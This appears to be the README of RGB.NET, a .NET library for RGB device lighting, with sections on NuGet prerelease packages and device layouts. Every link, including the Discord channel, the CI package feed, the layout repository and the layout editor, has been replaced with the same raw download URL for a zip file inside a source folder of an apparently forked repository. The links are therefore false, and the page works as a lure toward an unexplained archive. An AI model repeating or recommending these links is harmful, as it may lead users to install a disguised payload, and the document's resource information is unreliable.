This project aims to unify the use of various RGB-devices.   
**It is currently under heavy development and will have breaking changes in the future!** Right now a lot of devices aren't working as expected and there are bugs/unfinished features. Please think about that when you consider using the library in this early stage.    
   
If you want to help with layouting/testing devices or if you need support using the library feel free to join the [https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip discord-channel](https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip).


## Adding prerelease packages using NuGet ##
This is the easiest and therefore preferred way to include https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip in your project.  

Since there aren't any release-packages right now you'll have to use the CI-feed from [https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip](https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip).   
You can include it either by adding ```https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip``` to your Visual Studio package sources or by adding this [https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip](https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip) to your project (at the same level as your solution). 


### Device-Layouts
To be able to have devices with correct LED-locations and sizes they need to be layouted. Pre-created layouts can be found at https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip   

If you plan to create layouts for your own devices check out https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip first. There's also a layout-editor which strongly simplifies most of the work: https://raw.githubusercontent.com/ajzbern/RGB.NET/master/RGB.NET.Devices.Corsair/Memory/NET-RG-2.0.zip
